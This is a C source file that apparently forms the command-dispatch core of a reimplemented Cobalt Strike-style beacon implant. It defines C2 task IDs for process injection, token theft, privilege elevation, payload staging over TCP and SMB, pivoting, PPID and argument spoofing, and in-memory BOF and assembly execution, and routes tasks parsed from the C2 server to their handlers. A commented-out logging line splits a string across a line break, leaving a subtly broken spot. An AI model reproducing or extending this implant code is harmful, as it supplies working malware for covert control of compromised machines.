#include "channel.h"
#include "commands.h"
#include "security.h"
#include "beacon.h"
#include "link.h"
#include "build.h"
#include "parse.h"
#include "spawn_trace.h"
#include "bformat.h"
#include "datastore.h"

#define COMMAND_SPAWN          0x01
#define COMMAND_SHELL          0x02
#define COMMAND_DIE            0x03
#define COMMAND_SLEEP          0x04
#define COMMAND_CD             0x05
#define COMMAND_KEYLOG_START   0x06
#define COMMAND_KEYLOG_STOP    0x07
/* 0x08 is CHECKIN on the wire (TaskBeacon.Checkin); keylog moved to TS-side jobs ago.
 * Official semantics: "basically a no-op" for HTTP beacons; for DNS beacons the TS
 * flips the session to check-in-required itself and we answer via the idlemask signal,
 * so accepting and dropping the task matches official behavior. */
#define COMMAND_CHECKIN        0x08
#define COMMAND_INJECT_PID     0x09
#define COMMAND_UPLOAD         0x0A
#define COMMAND_DOWNLOAD       0x0B
#define COMMAND_EXECUTE        0x0C
#define COMMAND_SPAWN_PROC_X86 0x0D
#define COMMAND_CONNECT        0x0E
#define COMMAND_SEND           0x0F
#define COMMAND_CLOSE          0x10
#define COMMAND_LISTEN         0x11
#define COMMAND_INJECT_PING    0x12
#define COMMAND_DOWNLOAD_STOP  0x13
#define COMMAND_CHANNEL_SMB    0x14
#define COMMAND_PIPE_OPEN      0x15
#define COMMAND_PIPE_ROUTE     0x16
#define COMMAND_PIPE_CLOSE     0x17
#define COMMAND_PIPE_REOPEN    0x18
#define COMMAND_GETSYSTEM      0x19
#define COMMAND_BYPASSUAC      0x1A
#define COMMAND_TOKEN_GETUID   0x1B
#define COMMAND_TOKEN_REV2SELF 0x1C
#define COMMAND_TIMESTOMP      0x1D
#define COMMAND_DEPRECATE_D    0x1E
#define COMMAND_STEAL_TOKEN    0x1F
#define COMMAND_PS_LIST        0x20
#define COMMAND_PS_KILL        0x21
#define COMMAND_KERB_TKT_USE   0x22
#define COMMAND_KERB_TKT_PURGE 0x23
#define COMMAND_PSH_RUN        0x24
#define COMMAND_PSH_IMPORT     0x25
#define COMMAND_RUNAS          0x26
#define COMMAND_PWD            0x27
#define COMMAND_JOB_REGISTER   0x28
#define COMMAND_JOBS           0x29
#define COMMAND_JOB_KILL       0x2a
#define COMMAND_INJECTX64_PID  0x2b
#define COMMAND_SPAWNX64       0x2c
#define COMMAND_INJECT_PID_PING    0x2d
#define COMMAND_INJECTX64_PID_PING 0x2e
#define COMMAND_PAUSE              0x2f
#define COMMAND_IPCONFIG           0x30
#define COMMAND_LOGINUSER          0x31
#define COMMAND_LSOCKET_BIND	   0x32
#define COMMAND_LSOCKET_CLOSE      0x33
#define COMMAND_STAGE_PAYLOAD      0x34
#define COMMAND_FILE_LIST          0x35
#define COMMAND_FILE_MKDIR         0x36
#define COMMAND_FILE_DRIVES        0x37
#define COMMAND_FILE_RM            0x38
#define COMMAND_STAGE_PAYLOAD_SMB  0x39
#define COMMAND_PSEXEC_COMMAND     0x3a
#define COMMAND_WEBSERVER_LOCAL    0x3b
#define COMMAND_ELEVATE_PRE        0x3c
#define COMMAND_ELEVATE_POST       0x3d
#define COMMAND_JOB_REGISTER_IMPERSONATE 0x3e
#define COMMAND_SPAWN_POWERSHELLX86  0x3f
#define COMMAND_SPAWN_POWERSHELLX64  0x40
#define COMMAND_INJECT_POWERSHELLX86_PID 0x41
#define COMMAND_INJECT_POWERSHELLX64_PID 0x42
#define COMMAND_UPLOAD_CONTINUE		0x43
#define COMMAND_PIPE_OPEN_EXPLICIT  0x44
#define COMMAND_SPAWN_PROC_X64      0x45
#define COMMAND_JOB_SPAWN_X86       0x46
#define COMMAND_JOB_SPAWN_X64       0x47
#define COMMAND_SETENV              0x48
#define COMMAND_FILE_COPY           0x49
#define COMMAND_FILE_MOVE           0x4a
#define COMMAND_PPID                0x4b
#define COMMAND_RUN_UNDER_PID       0x4c
#define COMMAND_GETPRIVS            0x4d
#define COMMAND_EXECUTE_JOB         0x4e
#define COMMAND_PSH_HOST_TCP        0x4f
#define COMMAND_DLL_LOAD            0x50
#define COMMAND_REG_QUERY           0x51
#define COMMAND_LSOCKET_TCPPIVOT    0x52
#define COMMAND_ARGUE_ADD           0x53
#define COMMAND_ARGUE_REMOVE        0x54
#define COMMAND_ARGUE_LIST          0x55
#define COMMAND_TCP_CONNECT         0x56
#define COMMAND_JOB_SPAWN_TOKEN_X86 0x57
#define COMMAND_JOB_SPAWN_TOKEN_X64 0x58
#define COMMAND_SPAWN_TOKEN_X86     0x59
#define COMMAND_SPAWN_TOKEN_X64     0x5a
#define COMMAND_INJECTX64_PING      0x5b
#define COMMAND_BLOCKDLLS           0x5c
#define COMMAND_SPAWNAS_X86         0x5d
#define COMMAND_SPAWNAS_X64         0x5e
#define COMMAND_INLINE_EXECUTE      0x5f
#define COMMAND_ELEVATE_RUN_INJ_X86 0x60
#define COMMAND_ELEVATE_RUN_INJ_X64 0x61
#define COMMAND_SPAWNU_X86          0x62
#define COMMAND_SPAWNU_X64          0x63
#define COMMAND_INLINE_EXECUTE_OBJECT 0x64
#define COMMAND_JOB_REGISTER_MSGMODE 0x65
#define COMMAND_LSOCKET_BIND_LOCALHOST 0x66
#define COMMAND_CONNECT_UDP            103
#define COMMAND_SEND_UDP               104
#define COMMAND_TOKEN_STORE            105
#define COMMAND_CHANGE_SYSCALL_METHOD  112
#define COMMAND_QUERY_SYSCALL_METHOD   113
#define COMMAND_DATA_STORE             115
#define COMMAND_DATA_STORE_INLINE_EXECUTE_OBJECT 116
#define COMMAND_DATA_STORE_EXECUTE_ASSEMBLY 117
/* tier-2 item5 (4.10 execute-dll parity): postex job spawn with a user
 * DLL + parameter blob, and bjob_send_data pipe writes. Our extension
 * ids (0x76-0x78); official 4.10 numbers unknown, both ends are ours. */
#define COMMAND_JOB_SPAWN_USER_X86 0x76
#define COMMAND_JOB_SPAWN_USER_X64 0x77
#define COMMAND_JOB_DATA           0x78

typedef struct {
	unsigned int   type;
	unsigned int   size;
} header;

void process_message(unsigned int type, char * buffer, int length) {
	switch (type) {
	case COMMAND_SPAWN:
		command_inject(buffer, length, TRUE, TRUE);
		break;
	case COMMAND_INJECT_PID:
		command_inject_pid(buffer, length, TRUE);
		break;
	case COMMAND_SHELL:
		/* deprecated */
		break;
	case COMMAND_DIE:
		command_die(command_shell_callback);
		break;
	case COMMAND_SLEEP:
		command_sleep(buffer, length);
		break;
	case COMMAND_CD:
		command_cd(buffer, length);
		break;
	case COMMAND_CHECKIN:
		/* no-op by design (see the define above) */
		break;
	case COMMAND_KEYLOG_START:
		/* deprecated */
		break;
	case COMMAND_KEYLOG_STOP:
		/* deprecated */
		break;
	case COMMAND_UPLOAD:
		command_upload(buffer, length, "wb");
		break;
	case COMMAND_DOWNLOAD:
		command_download(buffer, length, command_shell_callback);
		break;
	case COMMAND_EXECUTE:
		command_execute(buffer, length);
		break;
	case COMMAND_SPAWN_PROC_X86:
		command_spawnproc(buffer, length, TRUE);
		break;
	case COMMAND_CONNECT:
		command_connect(buffer, length, command_shell_callback);
		break;
	case COMMAND_SEND:
		command_send(buffer, length);
		break;
	case COMMAND_CLOSE:
		command_close(buffer, length);
		break;
	case COMMAND_LISTEN:
		command_listen(buffer, length, command_shell_callback);
		break;
	case COMMAND_INJECT_PING:
		command_inject_ping(buffer, length, TRUE, command_shell_callback);
		break;
	case COMMAND_DOWNLOAD_STOP:
		command_download_stop(buffer, length);
		break;
	case COMMAND_CHANNEL_SMB:
		/* deprecated */
		break;
	case COMMAND_PIPE_OPEN:
		/* deprecated */
		break;
	case COMMAND_PIPE_ROUTE:
		command_link_route(buffer, length, command_shell_callback);
		break;
	case COMMAND_PIPE_CLOSE:
		command_link_stop(buffer, length, command_shell_callback);
		break;
	case COMMAND_PIPE_REOPEN:
		command_link_reopen(buffer, length, command_shell_callback);
		break;
	case COMMAND_TOKEN_GETUID:
		command_getuid(buffer, length, command_shell_callback);
		break;
	case COMMAND_TOKEN_REV2SELF:
		command_rev2self();
		command_shell_callback("", 0, CALLBACK_TOKEN_REV2SELF);
		break;
	case COMMAND_STEAL_TOKEN:
		command_steal_token(buffer, length, command_shell_callback);
		break;
	case COMMAND_GETSYSTEM:
		/* deprecated */
		break;
	case COMMAND_BYPASSUAC:
		/* deprecated */
		break;
	case COMMAND_TIMESTOMP:
		/* deprecated 4.1 */
		break;
	case COMMAND_PS_LIST:
		command_ps_list(buffer, length, command_shell_callback);
		break;
	case COMMAND_PS_KILL:
		command_ps_kill(buffer, length);
		break;
	case COMMAND_KERB_TKT_USE:
		/* deprecated */
		break;
	case COMMAND_KERB_TKT_PURGE:
		/* deprecated */
		break;
	case COMMAND_PSH_RUN:
		/* deprecated */
		break;
	case COMMAND_PSH_IMPORT:
		command_psh_import(buffer, length);
		break;
	case COMMAND_RUNAS:
		command_runas(buffer, length, command_shell_callback);
		break;
	case COMMAND_PWD:
		command_pwd(command_shell_callback);
		break;
	case COMMAND_JOB_REGISTER:
		command_job_register(buffer, length, FALSE, JOB_MODE_BYTE);
		break;
	case COMMAND_JOBS:
		command_jobs(command_shell_callback);
		break;
	case COMMAND_JOB_KILL:
		command_job_kill(buffer, length);
		break;
	case COMMAND_INJECTX64_PID:
		command_inject_pid(buffer, length, FALSE);
		break;
	case COMMAND_SPAWNX64:
		command_inject(buffer, length, FALSE, TRUE);
		break;
	case COMMAND_INJECT_PID_PING:
		command_inject_pid_ping(buffer, length, command_shell_callback, TRUE);
		break;
	case COMMAND_INJECTX64_PID_PING:
		command_inject_pid_ping(buffer, length, command_shell_callback, FALSE);
		break;
	case COMMAND_PAUSE:
		command_pause(buffer, length);
		break;
	case COMMAND_IPCONFIG:
		/* deprecated 4.2 */
		break;
	case COMMAND_LOGINUSER:
		command_loginuser(buffer, length, command_shell_callback);
		break;
	case COMMAND_LSOCKET_BIND:
		command_socket_bind(buffer, length, INADDR_ANY);
		break;
	case COMMAND_LSOCKET_CLOSE:
		command_socket_close(buffer, length);
		break;
	case COMMAND_STAGE_PAYLOAD:
		command_stage_payload(buffer, length);
		break;
	case COMMAND_FILE_LIST:
		command_file_list(buffer, length, command_shell_callback);
		break;
	case COMMAND_FILE_MKDIR:
		command_file_mkdir(buffer, length);
		break;
	case COMMAND_FILE_DRIVES:
		command_file_drives(buffer, length, command_shell_callback);
		break;
	case COMMAND_FILE_RM:
		command_file_delete(buffer, length);
		break;
	case COMMAND_STAGE_PAYLOAD_SMB:
		command_stage_payload_smb(buffer, length);
		break;
	case COMMAND_PSEXEC_COMMAND:
		/* deprecated 4.1 */
		break;
	case COMMAND_WEBSERVER_LOCAL:
		command_webserver_local(buffer, length);
		break;
	case COMMAND_ELEVATE_PRE:
		command_elevate_pre(buffer, length);
		break;
	case COMMAND_ELEVATE_POST:
		command_elevate_post(command_shell_callback);
		break;
	case COMMAND_JOB_REGISTER_IMPERSONATE:
		command_job_register(buffer, length, TRUE, JOB_MODE_BYTE);
		break;
	case COMMAND_SPAWN_POWERSHELLX86:
		/* deprecated */
		break;
	case COMMAND_SPAWN_POWERSHELLX64:
		/* deprecated */
		break;
	case COMMAND_INJECT_POWERSHELLX86_PID:
		/* deprecated */
		break;
	case COMMAND_INJECT_POWERSHELLX64_PID:
		/* deprecated */
		break;
	case COMMAND_UPLOAD_CONTINUE:
		command_upload(buffer, length, "ab");
		break;
	case COMMAND_PIPE_OPEN_EXPLICIT:
		command_link_start_explicit(buffer, length, command_shell_callback);
		break;
	case COMMAND_SPAWN_PROC_X64:
		command_spawnproc(buffer, length, FALSE);
		break;
	case COMMAND_JOB_SPAWN_X86:
		command_job_spawn(buffer, length, TRUE, TRUE);
		break;
	case COMMAND_JOB_SPAWN_X64:
		command_job_spawn(buffer, length, FALSE, TRUE);
		break;
	case COMMAND_SETENV:
		command_setenv(buffer, length);
		break;
	case COMMAND_FILE_COPY:
		command_file_copy(buffer, length);
		break;
	case COMMAND_FILE_MOVE:
		command_file_move(buffer, length);
		break;
	case COMMAND_PPID:
		command_ppid(buffer, length);
		break;
	case COMMAND_RUN_UNDER_PID:
		command_runu(buffer, length);
		break;
	case COMMAND_GETPRIVS:
		command_getprivs(buffer, length, command_shell_callback);
		break;
	case COMMAND_EXECUTE_JOB:
		command_execjob(buffer, length);
		break;
	case COMMAND_PSH_HOST_TCP:
		command_psh_host_tcp(buffer, length);
		break;
	case COMMAND_DLL_LOAD:
		/* deprecated 4.1 */
		break;
	case COMMAND_REG_QUERY:
		/* deprecated 4.1 */
		break;
	case COMMAND_LSOCKET_TCPPIVOT:
		command_socket_tcppivot(buffer, length);
		break;
	case COMMAND_ARGUE_ADD:
		command_argue_add(buffer, length);
		break;
	case COMMAND_ARGUE_REMOVE:
		command_argue_remove(buffer, length);
		break;
	case COMMAND_ARGUE_LIST:
		command_argue_list(command_shell_callback);
		break;
	case COMMAND_TCP_CONNECT:
		command_tcp_connect(buffer, length, command_shell_callback);
		break;
	case COMMAND_JOB_SPAWN_TOKEN_X86:
		command_job_spawn(buffer, length, TRUE, FALSE);
		break;
	case COMMAND_JOB_SPAWN_TOKEN_X64:
		command_job_spawn(buffer, length, FALSE, FALSE);
		break;
	case COMMAND_SPAWN_TOKEN_X86:
		command_inject(buffer, length, TRUE, FALSE);
		break;
	case COMMAND_SPAWN_TOKEN_X64:
		command_inject(buffer, length, FALSE, FALSE);
		break;
	case COMMAND_INJECTX64_PING:
		command_inject_ping(buffer, length, FALSE, command_shell_callback);
		break;
	case COMMAND_BLOCKDLLS:
		command_blockdlls(buffer, length);
		break;
	case COMMAND_SPAWNAS_X86:
		command_spawnas(buffer, length, TRUE);
		break;
	case COMMAND_SPAWNAS_X64:
		command_spawnas(buffer, length, FALSE);
		break;
	case COMMAND_INLINE_EXECUTE:
		/* deprecated in 4.1 */
		break;
	case COMMAND_ELEVATE_RUN_INJ_X86:
		/* deprecated in 4.1 */
		break;
	case COMMAND_ELEVATE_RUN_INJ_X64:
		/* deprecated in 4.1 */
		break;
	case COMMAND_SPAWNU_X86:
		command_spawnu(buffer, length, TRUE);
		break;
	case COMMAND_SPAWNU_X64:
		command_spawnu(buffer, length, FALSE);
		break;
	case COMMAND_INLINE_EXECUTE_OBJECT:
		command_inline_execute_object(buffer, length);
		break;
	case COMMAND_JOB_REGISTER_MSGMODE:
		command_job_register(buffer, length, FALSE, JOB_MODE_MESSAGE);
		break;
	case COMMAND_LSOCKET_BIND_LOCALHOST:
		command_socket_bind(buffer, length, 0x0100007f);
		break;
	case COMMAND_CONNECT_UDP:
		command_connect_udp(buffer, length, command_shell_callback);
		break;
	case COMMAND_SEND_UDP:
		command_send_udp(buffer, length);
		break;
	case COMMAND_TOKEN_STORE:
		command_token_store(buffer, length, command_shell_callback);
		break;
	case COMMAND_CHANGE_SYSCALL_METHOD:
		command_syscall_method_change(buffer, length, command_shell_callback);
		break;
	case COMMAND_QUERY_SYSCALL_METHOD:
		command_syscall_method_query(command_shell_callback);
		break;
	case COMMAND_DATA_STORE:
		command_data_store(buffer, length, command_shell_callback);
		break;
	case COMMAND_DATA_STORE_INLINE_EXECUTE_OBJECT:
		command_data_store_inline_execute(buffer, length);
		break;
	case COMMAND_DATA_STORE_EXECUTE_ASSEMBLY:
		command_data_store_execute_assembly(buffer, length, TRUE, TRUE);
		break;
	case COMMAND_JOB_SPAWN_USER_X86:
		command_job_spawn_user(buffer, length, TRUE);
		break;
	case COMMAND_JOB_SPAWN_USER_X64:
	command_job_spawn_user(buffer, length, FALSE);
		break;
	case COMMAND_JOB_DATA:
		command_job_data(buffer, length);
		break;
	}
}

/* process through the buffer... extract the length, type, and value */
void process_payload(char * buffer, unsigned int length) {
	header h;
	unsigned int pos = 0;

	while (pos < length) {
		/* a trailing fragment smaller than a header is corruption (or a
		 * truncated dump) - never read past the payload */
		if ((length - pos) < sizeof(header))
			return;

		memcpy((void *)&h, buffer + pos, sizeof(header));

		/* fix the endian values */
		h.type = ntohl(h.type);
		h.size = ntohl(h.size);

		/* sanity check our data (64-bit compare: pos + h.size + header can
		 * wrap 32 bits on a corrupt h.size and would pass a 32-bit test) */
		if (((unsigned long long)pos + h.size + sizeof(header)) > (unsigned long long)length) {
			//dlog("Corrupt size: pos:%d size:%d len:%d\n", pos, h.size, length);
			return;
		}

		/* process our message */
		//dlog("Process Message: %d t: %d h:%d
", h.size, h.type, sizeof(header));
		process_message(h.type, buffer + pos + sizeof(header), h.size);

		/* on to the next message please */
		pos += h.size + sizeof(header);
	}

	/* cleanup the data we just processed */
	memset(buffer, 0, length);
}
